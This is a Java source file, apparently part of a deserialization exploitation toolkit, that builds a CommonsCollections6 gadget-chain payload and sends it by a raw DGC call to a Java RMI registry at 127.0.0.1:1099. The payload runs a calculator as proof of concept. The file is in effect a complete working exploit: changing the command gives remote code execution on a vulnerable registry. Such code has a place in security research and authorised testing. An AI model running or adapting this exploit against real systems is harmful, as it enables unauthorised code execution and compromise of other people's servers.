package xyz.eki.marshalexp.rmi.attack;

import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.rmi.utils.RemoteUtils;

import java.rmi.server.ObjID;

public class AttackRegistryByDGC {
    public static void main(String[] args) throws Exception{
        String registryHost = "127.0.0.1";
        int registryPort = 1099;
        final Object payloadObject = new CC6().getPocObject("mate-calc");
        ObjID objID = new ObjID(2);
        RemoteUtils.sendRawCall(registryHost, registryPort,  objID, 0, -669196253586618813L,payloadObject);
    }
}
